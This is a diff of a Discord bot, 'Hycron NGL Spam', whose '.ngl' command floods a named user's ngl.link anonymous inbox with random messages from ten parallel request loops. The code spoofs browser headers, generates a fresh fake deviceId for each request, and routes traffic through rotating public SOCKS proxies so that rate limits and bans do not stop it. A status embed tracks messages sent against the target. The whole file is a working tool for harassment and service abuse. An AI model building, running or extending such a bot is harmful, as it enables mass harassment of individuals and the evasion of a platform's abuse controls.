@@ -12,8 +12,8 @@ const client = new Client({
     ]
 });
 
-// ============= CONFIGURATION =============
 const PREFIX = '.';
+const activeSessions = new Map();
 const REQUIRED_GUILD_ID = '1452999261972201637';
 const ADMIN_ID = '986240868761632819';
 const BOT_APPLICATION_ID = '1454157889836028148';
@@ -21,8 +21,6 @@ const MAX_DURATION = 5;
 const DEFAULT_THREADS = 10;
 const MAX_CONCURRENT_TASKS = 5;
 
-// ============= STATE =============
-const activeSessions = new Map();
 let botEnabled = true;
 let useProxy = false;
 let proxies = [];
@@ -35,29 +33,6 @@ const DEFAULT_MESSAGES = [
     'Hycron always on top!'
 ];
 
-// ============= DEVICE ID GENERATOR (PYTHON SCRIPT FORMAT) =============
-// Python code:
-// def eszkozidgeneralas():
-//   eszkozid = uuid.uuid4().hex
-//   return "-".join([eszkozid[i:i+8] for i in range(0, 32, 8)])
-// 
-// This creates: 8-8-8-8 format (32 hex chars split into 4 groups of 8)
-// Example: "a1b2c3d4-e5f6g7h8-i9j0k1l2-m3n4o5p6"
-const generateDeviceId = () => {
-    // Generate 32 random hex characters (like uuid.uuid4().hex in Python)
-    const hexString = crypto.randomBytes(16).toString('hex'); // 16 bytes = 32 hex chars
-    
-    // Split into 4 groups of 8 characters with dashes
-    // This matches the Python script exactly
-    const parts = [];
-    for (let i = 0; i < 32; i += 8) {
-        parts.push(hexString.substring(i, i + 8));
-    }
-    
-    return parts.join('-');
-};
-
-// ============= LOAD MESSAGES =============
 const loadCustomMessages = () => {
     try {
         if (fs.existsSync('messages.txt')) {
@@ -68,15 +43,20 @@ const loadCustomMessages = () => {
             
             if (messages.length > 0) {
                 customMessages = messages;
-                console.log(`✅ Loaded ${customMessages.length} messages from messages.txt`);
+                console.log(`Loaded ${customMessages.length} custom messages from messages.txt`);
                 return true;
+            } else {
+                console.log('messages.txt is empty, using default messages');
+                customMessages = DEFAULT_MESSAGES;
+                return false;
             }
+        } else {
+            console.log('messages.txt not found, using default messages');
+            customMessages = DEFAULT_MESSAGES;
+            return false;
         }
-        customMessages = DEFAULT_MESSAGES;
-        console.log('📝 Using default messages');
-        return false;
     } catch (error) {
-        console.error('❌ Error loading messages:', error);
+        console.error('Error loading custom messages:', error);
         customMessages = DEFAULT_MESSAGES;
         return false;
     }
@@ -87,235 +67,102 @@ const getRandomMessage = () => {
     return messages[Math.floor(Math.random() * messages.length)];
 };
 
-// ============= PROXY MANAGEMENT =============
 const loadProxies = async () => {
     try {
         const socks5Url = 'https://github.com/monosans/proxy-list/raw/refs/heads/main/proxies/socks5.txt';
+        const socks4Url = 'https://github.com/monosans/proxy-list/raw/refs/heads/main/proxies/socks4.txt';
         
-        console.log('🔍 Fetching proxies from GitHub...');
-        const response = await fetch(socks5Url);
-
-        if (response.ok) {
-            const text = await response.text();
-            const proxyList = text.split('\n')
+        console.log('Fetching proxies from GitHub...');
+        
+        const [socks5Response, socks4Response] = await Promise.all([
+            fetch(socks5Url).catch(() => null),
+            fetch(socks4Url).catch(() => null)
+        ]);
+        
+        let allProxies = [];
+        
+        if (socks5Response && socks5Response.ok) {
+            const socks5Text = await socks5Response.text();
+            const socks5Proxies = socks5Text.split('\n')
                 .map(line => line.trim())
-                .filter(line => line && line.includes(':'));
-            
-            // Shuffle
-            for (let i = proxyList.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [proxyList[i], proxyList[j]] = [proxyList[j], proxyList[i]];
-            }
-            
-            proxies = proxyList;
-            console.log(`✅ Loaded ${proxies.length} proxies`);
+                .filter(line => line && line.includes(':'))
+                .map(proxy => ({ proxy, type: 'socks5' }));
+            allProxies.push(...socks5Proxies);
+            console.log(`Loaded ${socks5Proxies.length} SOCKS5 proxies`);
         }
-
-        if (proxies.length === 0 && fs.existsSync('proxies.txt')) {
-            const content = fs.readFileSync('proxies.txt', 'utf-8');
-            proxies = content.split('\n')
+        
+        if (socks4Response && socks4Response.ok) {
+            const socks4Text = await socks4Response.text();
+            const socks4Proxies = socks4Text.split('\n')
                 .map(line => line.trim())
-                .filter(line => line && line.includes(':'));
-            console.log(`📁 Loaded ${proxies.length} proxies from local file`);
+                .filter(line => line && line.includes(':'))
+                .map(proxy => ({ proxy, type: 'socks4' }));
+            allProxies.push(...socks4Proxies);
+            console.log(`Loaded ${socks4Proxies.length} SOCKS4 proxies`);
+        }
+        
+        for (let i = allProxies.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [allProxies[i], allProxies[j]] = [allProxies[j], allProxies[i]];
+        }
+        
+        proxies = allProxies;
+        console.log(`Total proxies loaded: ${proxies.length} (mixed SOCKS4 and SOCKS5)`);
+        
+        if (proxies.length === 0) {
+            console.log('No proxies loaded from GitHub, checking local proxies.txt...');
+            if (fs.existsSync('proxies.txt')) {
+                const content = fs.readFileSync('proxies.txt', 'utf-8');
+                const localProxies = content.split('\n')
+                    .map(line => line.trim())
+                    .filter(line => line && line.includes(':'))
+                    .map(proxy => ({ proxy, type: 'auto' }));
+                proxies = localProxies;
+                console.log(`Loaded ${proxies.length} proxies from local file`);
+            }
         }
     } catch (error) {
-        console.error('❌ Error loading proxies:', error);
+        console.error('Error loading proxies:', error);
+        if (fs.existsSync('proxies.txt')) {
+            const content = fs.readFileSync('proxies.txt', 'utf-8');
+            const localProxies = content.split('\n')
+                .map(line => line.trim())
+                .filter(line => line && line.includes(':'))
+                .map(proxy => ({ proxy, type: 'auto' }));
+            proxies = localProxies;
+            console.log(`Fallback: Loaded ${proxies.length} proxies from local file`);
+        }
     }
 };
 
 const getNextProxy = () => {
     if (proxies.length === 0) return null;
-    const proxy = proxies[currentProxyIndex];
+    const proxyObj = proxies[currentProxyIndex];
     currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
-    return proxy;
+    return proxyObj;
 };
 
-// ============= MAIN NGL SPAM FUNCTION (EXACT PYTHON SCRIPT LOGIC) =============
-const sendNGLMessage = async (username, sessionId, threadId) => {
-    const session = activeSessions.get(sessionId);
-    if (!session) return;
-
-    let nemsikerult = 0; // "nemsikerult" = "failed" in Hungarian (matching Python var name)
-
-    while (session.active && (Date.now() < session.endTime)) {
-        try {
-            const kerdes = getRandomMessage(); // "kerdes" = "question" in Hungarian
-            const eszkozid = generateDeviceId(); // "eszkozid" = "deviceId" in Hungarian
-            
-            const url = 'https://ngl.link/api/submit';
-            
-            // Headers matching Python script EXACTLY
-            const fejresz = {
-                'Referer': `https://ngl.link/${username}`,
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0'
-            };
-
-            // Data matching Python script EXACTLY
-            const adat = {
-                'username': username,
-                'question': kerdes,
-                'deviceId': eszkozid,
-                'gameSlug': '',
-                'referrer': ''
-            };
-
-            // Convert to URL-encoded format
-            const params = new URLSearchParams(adat);
-
-            let fetchOptions = {
-                method: 'POST',
-                headers: fejresz,
-                body: params.toString()
-            };
-
-            // Add proxy if enabled
-            if (useProxy && proxies.length > 0) {
-                const proxy = getNextProxy();
-                try {
-                    const agent = new SocksProxyAgent(`socks5://${proxy}`);
-                    fetchOptions.agent = agent;
-                } catch (err) {
-                    console.log(`⚠️ Thread ${threadId}: Bad proxy`);
-                }
-            }
-
-            const elkuld = await fetch(url, fetchOptions);
-
-            if (elkuld.status === 200) {
-                // SUCCESS - matches Python script behavior
-                nemsikerult = 0;
-                session.sent++;
-                session.lastSuccess = Date.now();
-                console.log(`✅ Thread ${threadId}: Message sent (Total: ${session.sent})`);
-                
-                // 1 second delay like Python script
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-            } else {
-                // ERROR - matches Python script behavior
-                nemsikerult++;
-                session.errors++;
-                session.lastError = `HTTP ${elkuld.status}`;
-                
-                if (nemsikerult < 4) {
-                    // Retry logic from Python: try 3 times with 20s wait
-                    console.log(`⚠️ Thread ${threadId}: [${elkuld.status} (${nemsikerult}/3)] Failed! Retrying after 20s`);
-                    await new Promise(resolve => setTimeout(resolve, 20000));
-                } else {
-                    // After 3 failures, stop this thread (Python script behavior)
-                    console.log(`🛑 Thread ${threadId}: Failed after 3 attempts, stopping thread`);
-                    session.lastError = `Failed 3x: HTTP ${elkuld.status}`;
-                    break;
-                }
-            }
-
-        } catch (error) {
-            nemsikerult++;
-            session.errors++;
-            session.lastError = error.message.substring(0, 50);
-            console.error(`❌ Thread ${threadId}: ${error.message}`);
-            
-            if (nemsikerult < 4) {
-                await new Promise(resolve => setTimeout(resolve, 20000));
-            } else {
-                console.log(`🛑 Thread ${threadId}: Too many errors, stopping`);
-                break;
-            }
+const createProxyAgent = (proxyObj) => {
+    try {
+        const { proxy, type } = proxyObj;
+        
+        if (type === 'socks5') {
+            return new SocksProxyAgent(`socks5://${proxy}`);
+        } else if (type === 'socks4') {
+            return new SocksProxyAgent(`socks4://${proxy}`);
+        } else {
+            return new SocksProxyAgent(`socks5://${proxy}`);
         }
-    }
-
-    session.threadsCompleted++;
-    console.log(`🏁 Thread ${threadId} completed (${session.threadsCompleted}/${session.threads})`);
-    
-    if (session.threadsCompleted >= session.threads) {
-        session.active = false;
-        await finalizeSession(session);
-    }
-};
-
-// ============= STATUS EMBED UPDATES =============
-const updateStatusEmbed = async (session) => {
-    const elapsed = Math.floor((Date.now() - session.startTime) / 1000);
-    const remaining = Math.max(0, Math.floor((session.endTime - Date.now()) / 1000));
-    const minutes = Math.floor(remaining / 60);
-    const seconds = remaining % 60;
-    const rate = elapsed > 0 ? (session.sent / elapsed * 60).toFixed(1) : 0;
-    const proxyStatus = useProxy ? `✅ ON (${proxies.length})` : '❌ OFF';
-
-    const embed = new EmbedBuilder()
-        .setTitle('🎯 Hycron NGL Spam')
-        .setColor(0x5865F2)
-        .addFields(
-            { name: '👤 Target', value: `\`${session.username}\``, inline: true },
-            { name: '⏱️ Time Left', value: `\`${minutes}m ${seconds}s\``, inline: true },
-            { name: '🧵 Threads', value: `\`${session.threads}\``, inline: true },
-            { name: '✅ Sent', value: `\`${session.sent}\``, inline: true },
-            { name: '❌ Errors', value: `\`${session.errors}\``, inline: true },
-            { name: '📊 Rate', value: `\`${rate}/min\``, inline: true },
-            { name: '🔒 Proxy', value: proxyStatus, inline: true },
-            { name: '📡 Status', value: session.active ? '🟢 **ACTIVE**' : '🔴 **STOPPED**', inline: true },
-            { name: '🏁 Progress', value: `\`${session.threadsCompleted}/${session.threads}\` threads`, inline: true }
-        )
-        .setFooter({ text: `Hycron NGL Spam | Python Script Logic` })
-        .setTimestamp();
-
-    if (session.lastError) {
-        embed.addFields({ name: '⚠️ Last Error', value: `\`${session.lastError}\``, inline: false });
-    }
-
-    try {
-        await session.statusMessage.edit({ embeds: [embed] });
     } catch (error) {
-        // Ignore
+        console.error('Error creating proxy agent:', error);
+        return null;
     }
 };
 
-const finalizeSession = async (session) => {
-    const totalTime = Math.floor((Date.now() - session.startTime) / 1000);
-    const avgRate = totalTime > 0 ? (session.sent / totalTime * 60).toFixed(1) : 0;
-    const successRate = session.sent + session.errors > 0 
-        ? ((session.sent / (session.sent + session.errors)) * 100).toFixed(1)
-        : 0;
-
-    const embed = new EmbedBuilder()
-        .setTitle('✅ Hycron NGL Spam - Completed!')
-        .setColor(0x57F287)
-        .addFields(
-            { name: '👤 Target', value: `\`${session.username}\``, inline: true },
-            { name: '⏱️ Duration', value: `\`${session.duration}m\``, inline: true },
-            { name: '🧵 Threads', value: `\`${session.threads}\``, inline: true },
-            { name: '✅ Total Sent', value: `\`${session.sent}\``, inline: true },
-            { name: '❌ Total Errors', value: `\`${session.errors}\``, inline: true },
-            { name: '📊 Avg Rate', value: `\`${avgRate}/min\``, inline: true },
-            { name: '🎯 Success Rate', value: `\`${successRate}%\``, inline: true },
-            { name: '⏱️ Total Time', value: `\`${Math.floor(totalTime / 60)}m ${totalTime % 60}s\``, inline: true },
-            { name: '🏁 Status', value: '**FINISHED** ✅', inline: true }
-        )
-        .setFooter({ text: 'Hycron NGL Spam | Thanks for using!' })
-        .setTimestamp();
-
-    try {
-        await session.statusMessage.edit({ embeds: [embed] });
-    } catch (error) {
-        // Ignore
-    }
-
-    activeSessions.delete(session.sessionId);
-    console.log(`✅ Session ${session.sessionId} completed: ${session.sent} sent, ${session.errors} errors`);
-};
-
-// ============= BOT EVENTS =============
 client.once('ready', () => {
-    console.log(`✅ Logged in as ${client.user.tag}`);
-    console.log(`🚀 Hycron NGL Spam Bot - Python Script Logic`);
-    console.log(`📊 Servers: ${client.guilds.cache.size}`);
-    
-    // Test device ID generation
-    const testId = generateDeviceId();
-    console.log(`🔍 Device ID test: ${testId}`);
-    console.log(`   Format: 8-8-8-8 (Python script format)`);
-    
+    console.log(`Logged in as ${client.user.tag}`);
+    console.log('Hycron NGL Spam Bot is ready');
+    console.log('Use .setproxy on to load proxies from GitHub');
     loadCustomMessages();
     updateBotStatus();
 });
@@ -323,13 +170,21 @@ client.once('ready', () => {
 const updateBotStatus = () => {
     const serverCount = client.guilds.cache.size;
     client.user.setPresence({
-        activities: [{ name: `.hycron | ${serverCount} servers`, type: 0 }],
+        activities: [{
+            name: `.hycron | ${serverCount} Servers`,
+            type: 0
+        }],
         status: 'online'
     });
 };
 
-client.on('guildCreate', () => updateBotStatus());
-client.on('guildDelete', () => updateBotStatus());
+client.on('guildCreate', () => {
+    updateBotStatus();
+});
+
+client.on('guildDelete', () => {
+    updateBotStatus();
+});
 
 const isUserInRequiredGuild = async (userId) => {
     try {
@@ -341,118 +196,312 @@ const isUserInRequiredGuild = async (userId) => {
     }
 };
 
-// ============= COMMANDS =============
+const sendNGLMessage = async (username, sessionId, threadId) => {
+    const session = activeSessions.get(sessionId);
+    if (!session) return;
+
+    while (session.active && (Date.now() < session.endTime)) {
+        try {
+            const message = getRandomMessage();
+            const deviceId = crypto.randomBytes(21).toString('hex');
+            const url = 'https://ngl.link/api/submit';
+            const headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
+                'Accept': '*/*',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'Referer': `https://ngl.link/${username}`,
+                'Origin': 'https://ngl.link'
+            };
+            const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;
+
+            let fetchOptions = {
+                method: 'POST',
+                headers,
+                body,
+                mode: 'cors',
+                credentials: 'include'
+            };
+
+            if (useProxy && proxies.length > 0) {
+                const proxyObj = getNextProxy();
+                const agent = createProxyAgent(proxyObj);
+                if (agent) {
+                    fetchOptions.agent = agent;
+                }
+            }
+
+            const response = await fetch(url, fetchOptions);
+
+            if (response.status === 429) {
+                session.errors++;
+                session.lastError = 'Rate Limited';
+                await new Promise(resolve => setTimeout(resolve, 25000));
+            } else if (response.status !== 200) {
+                session.errors++;
+                session.lastError = `HTTP ${response.status}`;
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            } else {
+                session.sent++;
+                session.lastSuccess = Date.now();
+            }
+
+        } catch (error) {
+            session.errors++;
+            session.lastError = error.message.substring(0, 50);
+            await new Promise(resolve => setTimeout(resolve, 5000));
+        }
+    }
+
+    session.threadsCompleted++;
+    if (session.threadsCompleted >= session.threads) {
+        session.active = false;
+        await finalizeSession(session);
+    }
+};
+
+const updateStatusEmbed = async (session) => {
+    const elapsed = Math.floor((Date.now() - session.startTime) / 1000);
+    const remaining = Math.max(0, Math.floor((session.endTime - Date.now()) / 1000));
+    
+    const minutes = Math.floor(remaining / 60);
+    const seconds = remaining % 60;
+
+    const rate = elapsed > 0 ? (session.sent / elapsed * 60).toFixed(1) : 0;
+    const proxyStatus = useProxy ? `Enabled (${proxies.length} proxies)` : 'Disabled';
+
+    const embed = new EmbedBuilder()
+        .setTitle('Hycron NGL Spam')
+        .setColor(0x5865F2)
+        .addFields(
+            { name: 'Target', value: session.username, inline: true },
+            { name: 'Duration', value: `${session.duration}m`, inline: true },
+            { name: 'Threads', value: `${session.threads}`, inline: true },
+            { name: 'Sent', value: `${session.sent}`, inline: true },
+            { name: 'Errors', value: `${session.errors}`, inline: true },
+            { name: 'Remaining', value: `${minutes}m ${seconds}s`, inline: true },
+            { name: 'Rate', value: `${rate}/min`, inline: true },
+            { name: 'Proxy', value: proxyStatus, inline: true },
+            { name: 'Status', value: session.active ? 'Spamming' : 'Completed', inline: true }
+        )
+        .setFooter({ text: 'Hycron NGL Spam' })
+        .setTimestamp();
+
+    if (session.lastError) {
+        embed.addFields({ name: 'Last Error', value: session.lastError, inline: false });
+    }
+
+    try {
+        await session.statusMessage.edit({ embeds: [embed] });
+    } catch (error) {
+        console.error('Failed to update status embed:', error);
+    }
+};
+
+const finalizeSession = async (session) => {
+    const totalTime = Math.floor((Date.now() - session.startTime) / 1000);
+    const avgRate = totalTime > 0 ? (session.sent / totalTime * 60).toFixed(1) : 0;
+
+    const embed = new EmbedBuilder()
+        .setTitle('Hycron NGL Spam - Completed')
+        .setColor(0x57F287)
+        .addFields(
+            { name: 'Target', value: session.username, inline: true },
+            { name: 'Duration', value: `${session.duration}m`, inline: true },
+            { name: 'Threads', value: `${session.threads}`, inline: true },
+            { name: 'Total Sent', value: `${session.sent}`, inline: true },
+            { name: 'Total Errors', value: `${session.errors}`, inline: true },
+            { name: 'Avg Rate', value: `${avgRate}/min`, inline: true },
+            { name: 'Status', value: 'Finished', inline: false }
+        )
+        .setFooter({ text: 'Hycron NGL Spam' })
+        .setTimestamp();
+
+    try {
+        await session.statusMessage.edit({ embeds: [embed] });
+    } catch (error) {
+        console.error('Failed to finalize status embed:', error);
+    }
+
+    activeSessions.delete(session.sessionId);
+};
+
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.content.startsWith(PREFIX)) return;
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== ADMIN COMMANDS =====
     if (command === 'setstatus') {
         if (message.author.id !== ADMIN_ID) {
-            return message.reply('❌ Admin only!');
+            return message.reply('You do not have permission to use this command');
         }
 
-        const status = args[0]?.toLowerCase();
+        if (args.length === 0) {
+            return message.reply('Usage: .setstatus on/off');
+        }
+
+        const status = args[0].toLowerCase();
         if (status === 'on') {
             botEnabled = true;
-            return message.reply('✅ Bot **ENABLED**');
+            const embed = new EmbedBuilder()
+                .setTitle('Hycron Bot Status')
+                .setColor(0x57F287)
+                .setDescription('Hycron bot is now enabled')
+                .setFooter({ text: 'Hycron NGL Spam' })
+                .setTimestamp();
+            return message.reply({ embeds: [embed] });
         } else if (status === 'off') {
             botEnabled = false;
-            return message.reply('❌ Bot **DISABLED**');
+            const embed = new EmbedBuilder()
+                .setTitle('Hycron Bot Status')
+                .setColor(0xED4245)
+                .setDescription('Hycron bot is now disabled')
+                .setFooter({ text: 'Hycron NGL Spam' })
+                .setTimestamp();
+            return message.reply({ embeds: [embed] });
         } else {
-            return message.reply('Usage: `.setstatus on/off`');
+            return message.reply('Usage: .setstatus on/off');
         }
     }
 
     if (command === 'setproxy') {
         if (message.author.id !== ADMIN_ID) {
-            return message.reply('❌ Admin only!');
+            return message.reply('You do not have permission to use this command');
         }
 
-        const status = args[0]?.toLowerCase();
+        if (args.length === 0) {
+            return message.reply('Usage: .setproxy on/off');
+        }
+
+        const status = args[0].toLowerCase();
         if (status === 'on') {
-            const msg = await message.reply('⏳ Loading proxies...');
+            const loadingMsg = await message.reply('Loading proxies from GitHub...');
             await loadProxies();
+            
             if (proxies.length === 0) {
-                return msg.edit('❌ No proxies loaded!');
+                return loadingMsg.edit('Failed to load proxies. Please check your internet connection or add proxies to proxies.txt');
             }
+            
             useProxy = true;
-            return msg.edit(`✅ Proxy **ENABLED** (${proxies.length} proxies)`);
+            const embed = new EmbedBuilder()
+                .setTitle('Proxy Status')
+                .setColor(0x57F287)
+                .setDescription(`Proxy enabled with ${proxies.length} proxies loaded (SOCKS4 + SOCKS5 mixed)`)
+                .setFooter({ text: 'Hycron NGL Spam' })
+                .setTimestamp();
+            return loadingMsg.edit({ content: null, embeds: [embed] });
         } else if (status === 'off') {
             useProxy = false;
-            return message.reply('❌ Proxy **DISABLED**');
+            const embed = new EmbedBuilder()
+                .setTitle('Proxy Status')
+                .setColor(0xED4245)
+                .setDescription('Proxy disabled - using direct connection')
+                .setFooter({ text: 'Hycron NGL Spam' })
+                .setTimestamp();
+            return message.reply({ embeds: [embed] });
         } else {
-            return message.reply('Usage: `.setproxy on/off`');
+            return message.reply('Usage: .setproxy on/off');
         }
     }
 
     if (command === 'reloadmsg') {
         if (message.author.id !== ADMIN_ID) {
-            return message.reply('❌ Admin only!');
+            return message.reply('You do not have permission to use this command');
         }
 
-        loadCustomMessages();
-        return message.reply(`✅ Reloaded **${customMessages.length}** messages`);
+        const hasCustom = loadCustomMessages();
+        const messageCount = customMessages.length;
+        const messageType = hasCustom ? 'custom messages from messages.txt' : 'default messages';
+        
+        const embed = new EmbedBuilder()
+            .setTitle('Messages Reloaded')
+            .setColor(0x57F287)
+            .setDescription(`Successfully reloaded ${messageCount} ${messageType}`)
+            .setFooter({ text: 'Hycron NGL Spam' })
+            .setTimestamp();
+        
+        return message.reply({ embeds: [embed] });
     }
 
-    if (command === 'testdevice') {
-        if (message.author.id !== ADMIN_ID) {
-            return message.reply('❌ Admin only!');
-        }
-
-        const testId = generateDeviceId();
-        return message.reply(`🔍 Test Device ID:\n\`${testId}\`\n\nFormat: 8-8-8-8 (matches Python script)`);
-    }
-
-    // Check if bot is enabled
     if (!botEnabled) {
-        return message.reply('❌ Bot is currently **DISABLED** by admin');
+        const embed = new EmbedBuilder()
+            .setTitle('Hycron Bot Disabled')
+            .setColor(0xED4245)
+            .setDescription('Hycron bot is now disabled by the owner')
+            .setFooter({ text: 'Hycron NGL Spam' })
+            .setTimestamp();
+        return message.reply({ embeds: [embed] });
     }
 
-    // Check guild access
     const hasAccess = await isUserInRequiredGuild(message.author.id);
     if (!hasAccess && message.author.id !== ADMIN_ID) {
-        return message.reply('🔒 You must be in the required guild to use this bot!');
+        const embed = new EmbedBuilder()
+            .setTitle('Access Denied')
+            .setColor(0xED4245)
+            .setDescription('You must be a member of the required guild to use this bot')
+            .setFooter({ text: 'Hycron NGL Spam' })
+            .setTimestamp();
+        return message.reply({ embeds: [embed] });
     }
 
-    // ===== USER COMMANDS =====
     if (command === 'invite') {
         const inviteLink = `https://discord.com/api/oauth2/authorize?client_id=${BOT_APPLICATION_ID}&permissions=274877909056&scope=bot`;
         const embed = new EmbedBuilder()
-            .setTitle('📨 Invite Hycron Bot')
+            .setTitle('Invite Hycron Bot')
             .setColor(0x5865F2)
-            .setDescription(`[**Click here to invite**](${inviteLink})`)
-            .addFields({ name: 'Invite Link', value: `\`${inviteLink}\``, inline: false })
+            .setDescription(`[Click here to invite Hycron Bot](${inviteLink})`)
+            .addFields(
+                { name: 'Invite Link', value: inviteLink, inline: false }
+            )
+            .setFooter({ text: 'Hycron NGL Spam' })
             .setTimestamp();
         return message.reply({ embeds: [embed] });
     }
 
     if (command === 'hycron') {
+        const messageCount = customMessages.length;
+        const messageSource = customMessages === DEFAULT_MESSAGES ? 'default' : 'custom (messages.txt)';
+        
         const embed = new EmbedBuilder()
-            .setTitle('📚 Hycron NGL Spam - Commands')
+            .setTitle('Hycron NGL Spam Commands')
             .setColor(0x5865F2)
-            .setDescription('**Based on Python NGL-Spammer v4.3**')
+            .setDescription('Available commands for Hycron NGL Spam Bot')
             .addFields(
-                { 
-                    name: '`.ngl <username> <duration>`', 
-                    value: `Start NGL spam\n• Max: ${MAX_DURATION} minutes\n• Threads: ${DEFAULT_THREADS}\n• Messages: ${customMessages.length}\n• Device ID: 8-8-8-8 format`, 
-                    inline: false 
+                {
+                    name: '.hycron',
+                    value: 'Display all available commands',
+                    inline: false
                 },
-                { name: '`.hycron`', value: 'Show this help', inline: false },
-                { name: '`.invite`', value: 'Get invite link', inline: false },
-                { name: '\u200B', value: '**Admin Commands:**', inline: false },
-                { name: '`.setstatus on/off`', value: 'Enable/disable bot', inline: true },
-                { name: '`.setproxy on/off`', value: 'Enable/disable proxy', inline: true },
-                { name: '`.reloadmsg`', value: 'Reload messages', inline: true },
-                { name: '`.testdevice`', value: 'Test device ID', inline: true },
-                { name: '\u200B', value: '**Example:**', inline: false },
-                { name: '`.ngl john123 3`', value: 'Spam `john123` for 3 minutes', inline: false }
+                {
+                    name: '.ngl [username] [duration]',
+                    value: `Start NGL spam\nusername: Target NGL username\nduration: Duration in minutes (max ${MAX_DURATION})\nDefault threads: ${DEFAULT_THREADS}\nMax concurrent tasks: ${MAX_CONCURRENT_TASKS}\nMessages: ${messageCount} ${messageSource}`,
+                    inline: false
+                },
+                {
+                    name: '.invite',
+                    value: 'Get the bot invite link',
+                    inline: false
+                },
+                {
+                    name: 'Admin Commands',
+                    value: '.setstatus on/off - Toggle bot\n.setproxy on/off - Toggle proxy\n.reloadmsg - Reload messages from messages.txt',
+                    inline: false
+                },
+                {
+                    name: 'Example',
+                    value: '.ngl john123 3',
+                    inline: false
+                }
             )
-            .setFooter({ text: 'Hycron NGL Spam | Python Logic' })
+            .setFooter({ text: 'Hycron NGL Spam' })
             .setTimestamp();
-        return message.reply({ embeds: [embed] });
+
+        await message.reply({ embeds: [embed] });
     }
 
     if (command === 'ngl') {
@@ -460,39 +509,46 @@ client.on('messageCreate', async (message) => {
             .filter(s => s.userId === message.author.id && s.active);
 
         if (userActiveSessions.length >= MAX_CONCURRENT_TASKS) {
-            return message.reply(`❌ You can only run **${MAX_CONCURRENT_TASKS}** sessions at once!`);
+            return message.reply(`You can only run ${MAX_CONCURRENT_TASKS} spam tasks at the same time`);
         }
 
         if (args.length < 2) {
-            return message.reply('❌ Usage: `.ngl <username> <duration>`\nExample: `.ngl john123 3`');
+            return message.reply('Usage: .ngl [username] [duration]');
         }
 
         const username = args[0];
         let duration = parseInt(args[1]);
+        const threads = DEFAULT_THREADS;
 
         if (isNaN(duration) || duration <= 0) {
-            return message.reply('❌ Duration must be a positive number (in minutes)');
+            return message.reply('Duration must be a positive number in minutes');
         }
 
         if (duration > MAX_DURATION) {
-            return message.reply(`❌ Duration cannot exceed **${MAX_DURATION}** minutes`);
+            return message.reply(`Duration cannot exceed ${MAX_DURATION} minutes`);
         }
 
         const sessionId = `${message.author.id}-${Date.now()}`;
         const startTime = Date.now();
         const endTime = startTime + (duration * 60 * 1000);
-        const threads = DEFAULT_THREADS;
+
+        const proxyStatus = useProxy ? `Enabled (${proxies.length})` : 'Disabled';
 
         const initialEmbed = new EmbedBuilder()
-            .setTitle('🎯 Hycron NGL Spam - Starting...')
-            .setColor(0xFEE75C)
+            .setTitle('Hycron NGL Spam')
+            .setColor(0x5865F2)
             .addFields(
-                { name: '👤 Target', value: `\`${username}\``, inline: true },
-                { name: '⏱️ Duration', value: `\`${duration}m\``, inline: true },
-                { name: '🧵 Threads', value: `\`${threads}\``, inline: true },
-                { name: '📡 Status', value: '🟡 **STARTING**', inline: false }
+                { name: 'Target', value: username, inline: true },
+                { name: 'Duration', value: `${duration}m`, inline: true },
+                { name: 'Threads', value: `${threads}`, inline: true },
+                { name: 'Sent', value: '0', inline: true },
+                { name: 'Errors', value: '0', inline: true },
+                { name: 'Remaining', value: `${duration}m 0s`, inline: true },
+                { name: 'Rate', value: '0/min', inline: true },
+                { name: 'Proxy', value: proxyStatus, inline: true },
+                { name: 'Status', value: 'Starting', inline: true }
             )
-            .setFooter({ text: 'Python Script Logic | Initializing...' })
+            .setFooter({ text: 'Hycron NGL Spam' })
             .setTimestamp();
 
         const statusMessage = await message.reply({ embeds: [initialEmbed] });
@@ -516,26 +572,19 @@ client.on('messageCreate', async (message) => {
 
         activeSessions.set(sessionId, session);
 
-        // Start threads
         for (let i = 0; i < threads; i++) {
             sendNGLMessage(username, sessionId, i);
         }
 
-        console.log(`🚀 Session ${sessionId}: ${username}, ${duration}m, ${threads} threads`);
-
-        // Update every 3 seconds
         const updateInterval = setInterval(async () => {
             if (!session.active || Date.now() >= session.endTime) {
                 clearInterval(updateInterval);
                 return;
             }
             await updateStatusEmbed(session);
-        }, 3000);
-
-        setTimeout(() => updateStatusEmbed(session), 1000);
+        }, 2000);
     }
 });
 
-// ============= START BOT =============
-const TOKEN = 'TOKEN_DISCORD';
+const TOKEN = 'YOUR_TOKEN_HERE';
 client.login(TOKEN);
